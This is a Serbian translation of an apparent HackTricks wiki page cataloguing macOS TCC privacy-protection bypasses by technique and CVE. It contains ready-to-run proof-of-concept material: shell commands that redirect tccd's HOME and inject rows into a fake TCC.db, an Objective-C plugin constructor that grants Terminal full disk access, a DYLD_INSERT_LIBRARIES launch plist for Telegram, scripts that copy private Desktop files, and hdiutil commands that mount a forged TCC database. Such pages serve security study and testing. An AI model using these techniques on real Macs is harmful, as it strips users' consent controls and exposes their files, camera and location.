# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Po funkcionalnosti

### Write Bypass

Ovo nije bypass, već samo način na koji TCC radi: **Ne štiti od upisivanja**. Ako Terminal **nema pristup čitanju Desktop-a korisnika, i dalje može da upisuje u njega**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**Prošireni atribut `com.apple.macl`** dodaje se novom **file-u** kako bi **creators app** dobio pristup čitanju tog file-a.

### TCC ClickJacking

Moguće je **postaviti prozor preko TCC prompt-a** kako bi korisnik **prihvatio** zahtev, a da to ne primeti. PoC možete pronaći u [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Napadač može **kreirati aplikacije sa bilo kojim imenom** (npr. Finder, Google Chrome...) u **`Info.plist`** fajlu i učiniti da aplikacija zatraži pristup nekoj TCC zaštićenoj lokaciji. Korisnik će misliti da legitimna aplikacija zahteva ovaj pristup.\
Pored toga, moguće je **ukloniti legitimnu aplikaciju iz Dock-a i postaviti lažnu aplikaciju na njeno mesto**, tako da, kada korisnik klikne na lažnu aplikaciju (koja može koristiti istu ikonu), ona može pozvati legitimnu aplikaciju, zatražiti TCC dozvole i izvršiti malware, navodeći korisnika da poveruje da je legitimna aplikacija zahtevala pristup.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Više informacija i PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Podrazumevano, pristup putem **SSH-a ranije je imao "Full Disk Access"**. Da biste ga onemogućili, potrebno je da bude naveden, ali onemogućen (uklanjanje sa liste neće ukloniti te privilegije):

![TCC Request by arbitrary name - SSH Bypass: Podrazumevano, pristup putem SSH-a ranije je imao "Full Disk Access". Da biste ga onemogućili, potrebno je da bude naveden, ali onemogućen (uklanjanje...](<../../../../../images/image (1077).png>)

Ovde možete pronaći primere nekih **malware-a koji su uspeli da zaobiđu ovu zaštitu**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Imajte na umu da je sada, kako biste mogli da omogućite SSH, potreban **Full Disk Access**

### Handle extensions - CVE-2022-26767

Atribut **`com.apple.macl`** dodeljuje se file-ovima kako bi **određenoj aplikaciji dao dozvole za njihovo čitanje.** Ovaj atribut se postavlja kada se file **prevuče i otpusti** preko aplikacije ili kada korisnik **dvaput klikne** na file da bi ga otvorio pomoću **podrazumevane aplikacije**.

Zbog toga bi korisnik mogao **registrovati malicious app** za rukovanje svim ekstenzijama i pozvati Launch Services da **otvori** bilo koji file (čime će malicious file dobiti pristup njegovom čitanju).

### iCloud

Entitlement **`com.apple.private.icloud-account-access`** omogućava komunikaciju sa **`com.apple.iCloudHelper`** XPC servisom, koji će **obezbediti iCloud tokene**.

**iMovie** i **Garageband** imali su ovaj entitlement i druge entitlements koji su to omogućavali.

Za više **informacija** o exploitu za **dobijanje iCloud tokena** pomoću ovog entitlement-a pogledajte predavanje: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Aplikacija sa dozvolom **`kTCCServiceAppleEvents`** moći će da **kontroliše druge aplikacije**. To znači da bi mogla da **zloupotrebi dozvole dodeljene drugim aplikacijama**.

Za više informacija o Apple Scripts pogledajte:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Na primer, ako aplikacija ima **Automation dozvolu nad `iTerm`-om**, kao u ovom primeru gde **`Terminal`** ima pristup iTerm-u:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Nad iTerm-om

Terminal, koji nema FDA, može pozvati iTerm, koji ga ima, i koristiti ga za izvršavanje radnji:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Preko Finder-a

Ili, ako App ima pristup preko Finder-a, može da pokrene skriptu kao što je ova:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Prema ponašanju aplikacije

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

**`tccd daemon`** u **userland** okruženju koristi promenljivu **`HOME`** **env** za pristup korisničkoj TCC bazi podataka na lokaciji: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Prema [ovoj Stack Exchange objavi](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), a pošto se TCC daemon pokreće putem **`launchd`** unutar domena trenutnog korisnika, moguće je **kontrolisati sve environment variables** koje mu se prosleđuju.\
Stoga bi **attacker mogao da postavi promenljivu `$HOME` environment** u **`launchctl`** tako da pokazuje na **kontrolisani** **direktorijum**, da ponovo pokrene **TCC** daemon, a zatim direktno izmeni **TCC bazu podataka** i sebi dodeli **svako dostupno TCC entitlement** bez ikakvog upita krajnjem korisniku.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes je imao pristup lokacijama zaštićenim pomoću TCC-a, ali kada se kreira note, ona se **kreira na nezaštićenoj lokaciji**. Zato je bilo moguće zatražiti od aplikacije Notes da kopira zaštićeni fajl u note (odnosno na nezaštićenu lokaciju), a zatim pristupiti tom fajlu:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Binarni fajl `/usr/libexec/lsd`, sa bibliotekom `libsecurity_translocate`, imao je entitlement `com.apple.private.nullfs_allow`, koji mu je omogućavao kreiranje **nullfs** mount-a, kao i entitlement `com.apple.private.tcc.allow` sa **`kTCCServiceSystemPolicyAllFiles`**, koji mu je omogućavao pristup svakom fajlu.

Bilo je moguće dodati quarantine atribut na "Library", pozvati **`com.apple.security.translocation`** XPC service, nakon čega bi Library bio mapiran na **`$TMPDIR/AppTranslocation/d/d/Library`**, gde je bilo moguće **access**-ovati sve dokumente unutar Library-ja.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** ima zanimljivu funkciju: kada je pokrenut, on će **import**-ovati fajlove ubačene u **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** u korisnikovu "media library". Pored toga, poziva nešto poput: **`rename(a, b);`**, gde su `a` i `b`:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Ovakvo ponašanje funkcije **`rename(a, b);`** ranjivo je na **Race Condition**, jer je moguće ubaciti lažni **TCC.db** fajl u folder `Automatically Add to Music.localized`, a zatim, kada se kreira novi folder (b), kopirati fajl, obrisati ga i uputiti ga na **`~/Library/Application Support/com.apple.TCC`**/.
**More info** [**in the writeup**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)


### SQLITE_SQLLOG_DIR - CVE-2023-32422

Ako je **`SQLITE_SQLLOG_DIR="path/folder"`** podešen, to u osnovi znači da se **svaka otvorena db** kopira na tu putanju. U ovom CVE-u, ova kontrola je zloupotrebljena za **write** unutar **SQLite baze** koju će otvoriti process sa FDA nad TCC bazom, a zatim je **`SQLITE_SQLLOG_DIR`** zloupotrebljen zajedno sa **symlink-om u nazivu fajla**, tako da se, kada se ta baza **otvori**, korisnikov **TCC.db prepiše** otvorenom bazom.\
**More info** [**in the writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **and**[ **in the talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Ako je environment varijabla **`SQLITE_AUTO_TRACE`** podešena, biblioteka **`libsqlite3.dylib`** će početi da vrši **logging** svih SQL upita. Mnoge aplikacije su koristile ovu biblioteku, pa je bilo moguće logovati sve njihove SQLite upite.

Nekoliko Apple aplikacija koristilo je ovu biblioteku za pristup informacijama zaštićenim pomoću TCC-a.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Ova **env variable se koristi u `Metal` frameworku**, koji je dependency za različite programe, a najznačajniji je `Music`, koji ima FDA.

Podešavanje sledećeg: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Ako je `path` validan direktorijum, bug će se aktivirati i možemo koristiti `fs_usage` da vidimo šta se dešava u programu:

- fajl će biti `open()`-ovan, pod nazivom `path/.dat.nosyncXXXX.XXXXXX` (X je nasumičan)
- jedan ili više `write()` poziva će upisati sadržaj u fajl (mi ne kontrolišemo ovaj sadržaj)
- `path/.dat.nosyncXXXX.XXXXXX` će biti `rename()`-ovan u `path/name`

Ovo je upis privremenog fajla, nakon čega sledi **`rename(old, new)`**, **koji nije bezbedan.**

Nije bezbedan zato što mora **zasebno da razreši stare i nove putanje**, što može potrajati i biti ranjivo na Race Condition. Za više informacija možete pogledati `xnu` funkciju `renameat_internal()`.

> [!CAUTION]
> Dakle, ako privilegovani proces vrši preimenovanje iz foldera koji kontrolišete, mogli biste dobiti RCE i naterati ga da pristupi drugom fajlu ili, kao u ovom CVE-u, otvoriti fajl koji je privilegovana aplikacija kreirala i sačuvati FD.
>
> Ako preimenovanje pristupa folderu koji kontrolišete, dok ste izmenili source fajl ili imate FD ka njemu, menjate destination fajl (ili folder) tako da pokazuje na symlink, pa možete upisivati kad god želite.

Ovo je bio napad u ovom CVE-u. Na primer, da bismo prepisali korisnikov `TCC.db`, možemo:

- kreirati `/Users/hacker/ourlink` tako da pokazuje na `/Users/hacker/Library/Application Support/com.apple.TCC/`
- kreirati direktorijum `/Users/hacker/tmp/`
- postaviti `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- aktivirati bug pokretanjem `Music` sa ovom env var
- uhvatiti `open()` fajla `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X je nasumičan)
- ovde takođe `open()`-ujemo ovaj fajl za upis i zadržavamo file descriptor
- atomarno menjati `/Users/hacker/tmp` i `/Users/hacker/ourlink` **u petlji**
- ovo radimo da bismo povećali šanse za uspeh, pošto je race window prilično mali, ali gubitak race-a ima zanemarljive posledice
- sačekati malo
- proveriti da li smo imali sreće
- ako nismo, ponovo pokrenuti postupak od početka

Više informacija na [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Ako sada pokušate da koristite env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE`, aplikacije se neće pokrenuti

### Apple Remote Desktop

Kao root mogli biste da omogućite ovaj service, a **ARD agent bi imao full disk access**, što bi korisnik zatim mogao da zloupotrebi kako bi naterao agent da kopira novu **TCC korisničku bazu**.

## By **NFSHomeDirectory**

TCC koristi bazu u korisnikovom HOME folderu za kontrolu pristupa resursima specifičnim za korisnika, na lokaciji **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Zato, ako korisnik uspe da restartuje TCC sa $HOME env var koja pokazuje na **drugi folder**, mogao bi da kreira novu TCC bazu u **/Library/Application Support/com.apple.TCC/TCC.db** i prevari TCC da dodeli bilo koju TCC dozvolu bilo kojoj aplikaciji.

> [!TIP]
> Imajte na umu da Apple koristi podešavanje sačuvano u korisničkom profilu, u atributu **`NFSHomeDirectory`**, za **vrednost `$HOME`**. Zato, ako kompromitujete aplikaciju koja ima dozvole da menja ovu vrednost (**`kTCCServiceSystemPolicySysAdminFiles`**), ovu opciju možete **weaponize** pomoću TCC bypass-a.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**Prvi POC** koristi [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) za izmenu korisnikovog **HOME** foldera.

1. Preuzeti _csreq_ blob za ciljnu aplikaciju.
2. Postaviti lažni _TCC.db_ fajl sa potrebnim pristupom i _csreq_ blob-om.
3. Exportovati korisnikov Directory Services unos pomoću [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Izmeniti Directory Services unos kako bi se promenio korisnikov home directory.
5. Importovati izmenjeni Directory Services unos pomoću [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Zaustaviti korisnikov _tccd_ i rebootovati proces.

Drugi POC je koristio **`/usr/libexec/configd`**, koji je imao `com.apple.private.tcc.allow` sa vrednošću `kTCCServiceSystemPolicySysAdminFiles`.\
Bilo je moguće pokrenuti **`configd`** sa opcijom **`-t`**, pri čemu je attacker mogao da navede **custom Bundle za učitavanje**. Zato exploit **zamenjuje** metod promene korisnikovog home directory-ja pomoću **`dsexport`** i **`dsimport`** sa **`configd` code injection** tehnikom.

Za više informacija pogledajte [**originalni report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## By process injection

Postoje različite tehnike za ubacivanje koda u proces i zloupotrebu njegovih TCC privilegija:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Štaviše, najčešći process injection za bypass TCC-a je putem **plugins (load library)**.\
Plugins su dodatni kod, obično u obliku library fajlova ili plist-a, koji će biti **učitani od strane glavne aplikacije** i izvršavaće se u njenom kontekstu. Zato, ako je glavna aplikacija imala pristup fajlovima ograničenim pomoću TCC-a (putem dodeljenih dozvola ili entitlements), **custom code će ga takođe imati**.

### CVE-2020-27937 - Directory Utility

Aplikacija `/System/Library/CoreServices/Applications/Directory Utility.app` imala je entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, učitavala je plugins sa ekstenzijom **`.daplug`** i **nije imala hardened** runtime.

Da bi se ovaj CVE weaponize-ovao, **`NFSHomeDirectory`** se **menja** (zloupotrebom prethodno navedenog entitlement-a), kako bi bilo moguće **preuzeti kontrolu nad korisnikovom TCC bazom** i zaobići TCC.

Za više informacija pogledajte [**originalni report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** imao je entitlements `com.apple.security.cs.disable-library-validation` i `com.apple.private.tcc.manager`. Prvi je **omogućavao code injection**, a drugi mu je davao pristup za **upravljanje TCC-om**.

Ovaj binary je omogućavao učitavanje **third party plug-ins** iz foldera `/Library/Audio/Plug-Ins/HAL`. Zato je bilo moguće **učitati plugin i zloupotrebiti TCC dozvole** pomoću ovog POC-a:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Za više informacija pogledajte [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Device Abstraction Layer (DAL) Plug-Ins

System aplikacije koje otvaraju stream kamere putem Core Media I/O (aplikacije sa **`kTCCServiceCamera`**) učitavaju **ove plugine u proces** koji se nalaze u `/Library/CoreMediaIO/Plug-Ins/DAL` (nisu zaštićeni SIP-om).

Dovoljno je samo sačuvati library sa uobičajenim **constructorom** na toj lokaciji da bi se izvršio **inject code**.

Nekoliko Apple aplikacija bilo je ranjivo na ovo.

### Firefox

Firefox aplikacija je imala entitlements `com.apple.security.cs.disable-library-validation` i `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Za više informacija o tome kako ovo lako exploitovati, pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Binarni fajl `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` imao je entitlements **`com.apple.private.tcc.allow`** i **`com.apple.security.get-task-allow`**, što je omogućavalo injectovanje koda unutar procesa i korišćenje TCC privilegija.

### CVE-2023-26818 - Telegram

Telegram je imao entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** i **`com.apple.security.cs.disable-library-validation`**, pa je bilo moguće zloupotrebiti ga za **dobijanje pristupa njegovim dozvolama**, kao što je snimanje kamerom. [**Payload možete pronaći u writeup-u**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Obratite pažnju na to da je za učitavanje library-ja pomoću env varijable kreiran **prilagođeni plist**, a zatim je korišćen **`launchctl`** za njegovo pokretanje:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Putem open poziva

Moguće je pozvati **`open`** čak i kada ste u sandboxu.

### Terminal Scripts

Prilično je uobičajeno dodeliti terminalu **Full Disk Access (FDA)**, barem na računarima koje koriste tehnički stručnjaci. Takođe je moguće pomoću njega pozivati **`.terminal`** skripte.

**`.terminal`** skripte su plist fajlovi, poput ovog, sa komandom koja se izvršava u ključu **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Aplikacija bi mogla da napiše terminal script na lokaciju kao što je /tmp i da ga pokrene komandom kao što je:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Montiranjem

### CVE-2020-9771 - mount_apfs TCC bypass i eskalacija privilegija

**Bilo koji korisnik** (čak i korisnici bez privilegija) može da kreira i montira Time Machine snapshot i da ima **pristup SVIM datotekama** tog snapshot-a.\
**Jedina potrebna privilegija** je da aplikacija koja se koristi (kao što je `Terminal`) ima pristup **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), koji mora da odobri administrator.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Detaljnije objašnjenje možete [**pronaći u originalnom izveštaju**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount preko TCC fajla

Čak i kada je TCC DB fajl zaštićen, bilo je moguće **mount-ovati preko direktorijuma** novi TCC.db fajl:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Proverite **full exploit** u [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Kao što je objašnjeno u [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), ovaj CVE je zloupotrebljavao `diskarbitrationd`.

Funkcija `DADiskMountWithArgumentsCommon` iz javnog framework-a `DiskArbitration` obavljala je bezbednosne provere. Međutim, moguće je zaobići ih direktnim pozivanjem `diskarbitrationd` i na taj način koristiti elemente `../` u putanji i symlink-ove.

To je napadaču omogućilo proizvoljna mountovanja na bilo kojoj lokaciji, uključujući i preko TCC baze podataka, zbog entitlement-a `com.apple.private.security.storage-exempt.heritable` koji poseduje `diskarbitrationd`.

### asr

Alat **`/usr/sbin/asr`** omogućavao je kopiranje celog diska i njegovo mountovanje na drugoj lokaciji, zaobilazeći TCC zaštite.

### Location Services

Postoji i treća TCC baza podataka u **`/var/db/locationd/clients.plist`**, koja označava klijente kojima je dozvoljen **pristup location services**.\
Folder **`/var/db/locationd/` nije bio zaštićen od DMG mountovanja**, pa je bilo moguće mountovati sopstveni plist.

## Pomoću startup aplikacija


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Pomoću grep-a

U nekoliko slučajeva fajlovi će čuvati osetljive informacije, kao što su email adrese, brojevi telefona, poruke... na nezaštićenim lokacijama, što Apple smatra ranjivošću.

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Ovo više ne funkcioniše, ali je [**ranije funkcionisalo**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Drugi način je korišćenje [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
